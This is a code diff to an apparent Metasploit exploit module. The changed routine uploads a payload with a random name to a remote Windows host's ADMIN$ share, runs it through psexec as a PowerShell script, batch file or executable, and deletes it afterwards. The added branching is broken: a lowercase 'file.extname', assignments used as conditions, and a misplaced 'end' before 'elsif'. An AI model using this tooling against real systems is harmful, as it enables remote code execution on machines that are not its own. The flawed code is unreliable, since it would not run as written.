@@ -127,7 +127,8 @@ class MetasploitModule < Msf::Exploit::Remote
 	
 	 def true_upload(smb_share)
     share = "\\\\#{datastore['RHOST']}\\ADMIN$"
-    filename = remote_location
+	extention = file.extname(local_location)
+    filename = "#{Rex::Text.rand_text_alpha(8)}" + extention
 
     # payload as exe
     print_status("Uploading Payload...")
@@ -145,10 +146,18 @@ class MetasploitModule < Msf::Exploit::Remote
     fd << exe
     fd.close
     print_status("Created %SystemRoot%\\system32\\#{filename}")
-	psexec("powershell  \"& \"\"C:\\Windows\\system32\\#{filename}\"\"\"")
-	psexec("del /f C:\\Windows\\system32\\#{filename}")
-
-
+	if (extention = ".ps1")
+		psexec("powershell  \"& \"\"C:\\Windows\\system32\\#{filename}\"\"\"")
+		psexec("del /f C:\\Windows\\system32\\#{filename}")
+	end
+	elsif (extention = ".bat")
+		psexec("cd C:\\Windows\\system32")
+		psexec(filename)
+		psexec("del /f C:\\Windows\\system32\\#{filename}")
+	else 
+		psexec("cd C:\\Windows\\system32")
+		psexec("start " + filename)
+		psexec("del /f C:\\Windows\\system32\\#{filename}")
     # Disconnect from the ADMIN$
     simple.disconnect(share)
   end
